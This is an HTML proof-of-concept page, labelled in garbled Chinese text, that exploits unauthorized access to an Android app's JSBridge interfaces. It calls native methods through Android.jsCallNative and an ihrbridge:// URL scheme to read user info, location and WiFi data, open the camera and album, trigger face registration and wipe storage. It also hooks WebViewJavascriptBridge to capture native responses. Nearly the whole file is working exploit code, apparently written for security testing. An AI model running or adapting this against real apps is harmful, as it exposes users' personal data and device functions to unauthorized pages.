<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>JSBridge æœªæˆæƒè®¿é—® PoC</title>
    <style>
        * { box-sizing: border-box; }
        body { font-family: sans-serif; padding: 10px; background: #f0f0f0; margin: 0; }
        h3 { margin: 10px 0; color: #333; font-size: 16px; }
        .section {
            background: white;
            padding: 10px;
            margin-bottom: 10px;
            border-radius: 6px;
            box-shadow: 0 1px 3px rgba(0,0,0,0.1);
        }
        .section-title {
            font-weight: bold;
            margin-bottom: 8px;
            padding-bottom: 5px;
            border-bottom: 1px solid #eee;
            font-size: 14px;
        }
        .pluto { color: #4CAF50; }
        .irs { color: #2196F3; }
        button {
            padding: 6px 10px;
            margin: 3px;
            border: none;
            border-radius: 4px;
            font-size: 12px;
            cursor: pointer;
        }
        .btn-high { background: #f44336; color: white; }
        .btn-medium { background: #FF9800; color: white; }
        .btn-low { background: #4CAF50; color: white; }
        .btn-tool { background: #607D8B; color: white; }
        pre {
            border: 1px solid #ddd;
            padding: 8px;
            min-height: 150px;
            max-height: 300px;
            overflow-y: auto;
            white-space: pre-wrap;
            word-break: break-all;
            font-size: 11px;
            background: #1a1a1a;
            color: #0f0;
            border-radius: 4px;
            margin: 0;
        }
        .risk-high { border-left: 3px solid #f44336; }
        .risk-medium { border-left: 3px solid #FF9800; }
        .risk-low { border-left: 3px solid #4CAF50; }
        .input-group { margin: 5px 0; }
        .input-group input {
            padding: 5px;
            border: 1px solid #ddd;
            border-radius: 4px;
            width: 200px;
            font-size: 12px;
        }
        .input-group label { font-size: 12px; margin-right: 5px; }
    </style>
</head>
<body>
<h3>ğŸ”“ JSBridge æœªæˆæƒè®¿é—®æ¼æ´ PoC</h3>

<!-- å·¥å…·æ  -->
<div class="section">
    <button class="btn-tool" onclick="clearLog()">æ¸…ç©ºæ—¥å¿—</button>
    <button class="btn-tool" onclick="detectEnv()">æ£€æµ‹ç¯å¢ƒ</button>
    <button class="btn-tool" onclick="exportLog()">å¯¼å‡ºæ—¥å¿—</button>
</div>

<!-- PLUTO é«˜å± -->
<div class="section risk-high">
    <div class="section-title pluto">ğŸŸ¢ PLUTO åè®® - é«˜å±æ–¹æ³•</div>
    <button class="btn-high" onclick="pluto('getUserInfo', {})">ğŸ‘¤ getUserInfo</button>
    <button class="btn-high" onclick="pluto('location', {})">ğŸ“ location</button>
    <button class="btn-high" onclick="pluto('isLogin', {})">ğŸ” isLogin</button>
</div>

<!-- PLUTO ä¸­å± -->
<div class="section risk-medium">
    <div class="section-title pluto">ğŸŸ¢ PLUTO åè®® - ä¸­å±æ–¹æ³•</div>
    <button class="btn-medium" onclick="pluto('saveCacheData', {key:'test', value:'poc_data'})">ğŸ’¾ saveCacheData</button>
    <button class="btn-medium" onclick="pluto('textCopy', {text:'Copied by PoC'})">ğŸ“‹ textCopy</button>
    <button class="btn-medium" onclick="pluto('download', {url:'https://example.com/test.pdf'})">â¬‡ï¸ download</button>
    <button class="btn-medium" onclick="pluto('webGotoOtherApp', {scheme:'weixin://'})">ğŸš€ webGotoOtherApp</button>
    <div class="input-group">
        <label>URL:</label>
        <input type="text" id="newPageUrl" value="https://example.com" />
        <button class="btn-medium" onclick="pluto('openNewWebPage', {url:document.getElementById('newPageUrl').value})">ğŸŒ openNewWebPage</button>
    </div>
</div>

<!-- PLUTO ä½å± -->
<div class="section risk-low">
    <div class="section-title pluto">ğŸŸ¢ PLUTO åè®® - ä½å±æ–¹æ³•</div>
    <button class="btn-low" onclick="pluto('appVersion', {})">ğŸ“± appVersion</button>
    <button class="btn-low" onclick="pluto('getPhoneScreenInfo', {})">ğŸ“ getPhoneScreenInfo</button>
    <button class="btn-low" onclick="pluto('checkPermission', {permission:'camera'})">âœ… checkPermission</button>
    <button class="btn-low" onclick="pluto('goBack', {})">â¬…ï¸ goBack</button>
    <button class="btn-low" onclick="pluto('openPrivacySetPage', {})">âš™ï¸ openPrivacySetPage</button>
    <button class="btn-low" onclick="pluto('consoleLog', {msg:'PoC test log'})">ğŸ“ consoleLog</button>
</div>

<!-- IRS é«˜å± -->
<div class="section risk-high">
    <div class="section-title irs">ğŸ”µ IRS åè®® - é«˜å±æ–¹æ³•</div>
    <button class="btn-high" onclick="irs('openCamera', {isOpenAlbum:false})">ğŸ“· openCamera</button>
    <button class="btn-high" onclick="irs('openAlbum', {})">ğŸ–¼ï¸ openAlbum</button>
    <button class="btn-high" onclick="irs('getLocationInfo', {})">ğŸ“ getLocationInfo</button>
    <button class="btn-high" onclick="irs('getWiFiInfo', {})">ğŸ“¶ getWiFiInfo</button>
    <button class="btn-high" onclick="irs('livingCheck', {})">ğŸ‘ï¸ livingCheck</button>
    <button class="btn-high" onclick="irs('registerFace', {})">ğŸ˜€ registerFace</button>
    <button class="btn-high" onclick="irs('compareFace', {})">ğŸ” compareFace</button>
</div>

<!-- IRS ä¸­å± -->
<div class="section risk-medium">
    <div class="section-title irs">ğŸ”µ IRS åè®® - ä¸­å±æ–¹æ³•</div>
    <div class="input-group">
        <label>Key:</label>
        <input type="text" id="storageKey" value="testKey" style="width:80px"/>
        <label>Value:</label>
        <input type="text" id="storageValue" value="testValue" style="width:80px"/>
    </div>
    <button class="btn-medium" onclick="irs('setStorage', {key:document.getElementById('storageKey').value, value:document.getElementById('storageValue').value})">ğŸ’¾ setStorage</button>
    <button class="btn-medium" onclick="irs('getStorage', {key:document.getElementById('storageKey').value})">ğŸ“– getStorage</button>
    <button class="btn-medium" onclick="irs('clearStorage', {key:document.getElementById('storageKey').value})">ğŸ—‘ï¸ clearStorage</button>
    <button class="btn-medium" onclick="irs('clearAllStorage', {})">ğŸ’¥ clearAllStorage</button>
    <button class="btn-medium" onclick="irs('initFace', {})">ğŸ”§ initFace</button>
    <button class="btn-medium" onclick="irs('isHaveFace', {})">â“ isHaveFace</button>
    <div class="input-group">
        <label>URL:</label>
        <input type="text" id="irsWebViewUrl" value="https://example.com" />
        <button class="btn-medium" onclick="irs('openWebView', {url:document.getElementById('irsWebViewUrl').value})">ğŸŒ openWebView</button>
    </div>
</div>

<!-- IRS ä½å± -->
<div class="section risk-low">
    <div class="section-title irs">ğŸ”µ IRS åè®® - ä½å±æ–¹æ³•</div>
    <button class="btn-low" onclick="irs('close', {})">âŒ close</button>
    <button class="btn-low" onclick="irs('closeLocationInfo', {})">ğŸ“âŒ closeLocationInfo</button>
</div>

<!-- æ—¥å¿— -->
<div class="section">
    <div class="section-title">ğŸ“‹ è°ƒç”¨æ—¥å¿—</div>
    <pre id="log"></pre>
</div>

<script>
    var cbId = 0;

    function log(msg) {
        var el = document.getElementById('log');
        var time = new Date().toLocaleTimeString();
        el.textContent += '[' + time + '] ' + msg + '\n';
        el.scrollTop = el.scrollHeight;
    }

    function clearLog() {
        document.getElementById('log').textContent = '';
    }

    function exportLog() {
        var logContent = document.getElementById('log').textContent;
        var blob = new Blob([logContent], {type: 'text/plain'});
        var url = URL.createObjectURL(blob);
        var a = document.createElement('a');
        a.href = url;
        a.download = 'jsbridge_poc_log_' + Date.now() + '.txt';
        a.click();
    }

    function getCallbackId() {
        return 'cb_' + (++cbId) + '_' + Date.now();
    }

    // ========== å›è°ƒå‡½æ•° ==========

    function nativeCallback(data) {
        log('[PLUTO å›è°ƒ] ' + data);
        // å°è¯•è§£æJSON
        try {
            var obj = JSON.parse(data);
            log('[PLUTO è§£æ] ' + JSON.stringify(obj, null, 2));
        } catch(e) {}
    }

    var IrsJSBridge = {
        handleMessageFormNative: function(jsonStr) {
            log('[IRS å›è°ƒ] ' + jsonStr);
            try {
                var obj = JSON.parse(jsonStr);
                log('[IRS è§£æ] ' + JSON.stringify(obj, null, 2));
            } catch(e) {}
        }
    };

    // ========== Hook WebViewJavascriptBridge ==========

    (function setupHookLoop() {
        function hookOnce() {
            if (!window.WebViewJavascriptBridge) return;
            var bridge = window.WebViewJavascriptBridge;
            var old = bridge._handleMessageFromNative;
            if (typeof old === 'function' && !old.__patched) {
                var wrapped = function(jsonStr) {
                    log('[HOOK] _handleMessageFromNative: ' + jsonStr);
                    try {
                        var msg = JSON.parse(jsonStr);
                        if (msg && msg.responseId) {
                            if (msg.responseId === 'nativeCallback') {
                                nativeCallback(msg.responseData);
                            } else if (typeof window[msg.responseId] === 'function') {
                                window[msg.responseId](msg.responseData);
                            }
                        }
                    } catch (e) {
                        log('[HOOK ERROR] ' + e);
                    }
                    return old.apply(this, arguments);
                };
                wrapped.__patched = true;
                bridge._handleMessageFromNative = wrapped;
                log('[HOOK] âœ… å·²æŒ‚è½½æ‹¦æˆªå™¨');
            }
        }
        hookOnce();
        setInterval(hookOnce, 500);
    })();

    // ========== ç¯å¢ƒæ£€æµ‹ ==========

    function detectEnv() {
        log('========== ç¯å¢ƒæ£€æµ‹ ==========');
        log('window.Android: ' + (window.Android ? 'âœ… å­˜åœ¨' : 'âŒ ä¸å­˜åœ¨'));
        if (window.Android) {
            log('  - jsCallNative: ' + (typeof Android.jsCallNative));
            log('  - H2C_JSBridge: ' + (typeof Android.H2C_JSBridge));
        }
        log('window.WebViewJavascriptBridge: ' + (window.WebViewJavascriptBridge ? 'âœ… å­˜åœ¨' : 'âŒ ä¸å­˜åœ¨'));
        if (window.WebViewJavascriptBridge) {
            var patched = WebViewJavascriptBridge._handleMessageFromNative &&
                          WebViewJavascriptBridge._handleMessageFromNative.__patched;
            log('  - HookçŠ¶æ€: ' + (patched ? 'âœ… å·²æŒ‚è½½' : 'âŒ æœªæŒ‚è½½'));
        }
        log('================================');
    }

    // ========== PLUTO åè®®è°ƒç”¨ ==========

    function pluto(method, data) {
        log('--- [PLUTO] ' + method + ' ---');
        log('å‚æ•°: ' + JSON.stringify(data));
        try {
            if (!window.Android || typeof Android.jsCallNative !== 'function') {
                log('âŒ é”™è¯¯: Android.jsCallNative ä¸å­˜åœ¨');
                return;
            }
            var payload = {
                method: method,
                data: data
            };
            Android.jsCallNative(JSON.stringify(payload), 'nativeCallback');
            log('âœ… å·²è°ƒç”¨ï¼Œç­‰å¾…å›è°ƒ...');
        } catch (e) {
            log('âŒ å¼‚å¸¸: ' + e);
        }
    }

    // ========== IRS åè®®è°ƒç”¨ ==========

    function irs(method, data) {
        log('--- [IRS] ' + method + ' ---');
        log('å‚æ•°: ' + JSON.stringify(data));
        try {
            var id = getCallbackId();
            data.handlerName = method;
            var params = JSON.stringify(data);
            var url = 'ihrbridge://' + id + '/' + method + '?' + params;
            log('URL: ' + url);

            var iframe = document.createElement('iframe');
            iframe.style.display = 'none';
            iframe.src = url;
            document.body.appendChild(iframe);
            setTimeout(function() {
                document.body.removeChild(iframe);
            }, 100);
            log('âœ… å·²è§¦å‘ï¼Œç­‰å¾…å›è°ƒ...');
        } catch (e) {
            log('âŒ å¼‚å¸¸: ' + e);
        }
    }

    // ========== é¡µé¢åŠ è½½ ==========

    window.onload = function() {
        log('========== PoC å·²åŠ è½½ ==========');
        log('ğŸ”´ é«˜å±: æ•æ„Ÿä¿¡æ¯æ³„éœ²ã€éšç§æƒé™æ»¥ç”¨');
        log('ğŸŸ  ä¸­å±: æ•°æ®ç¯¡æ”¹ã€åŠŸèƒ½æ»¥ç”¨');
        log('ğŸŸ¢ ä½å±: ä¿¡æ¯æ”¶é›†ã€è¾…åŠ©æ”»å‡»');
        log('================================');
        detectEnv();
    };
</script>
</body>
</html>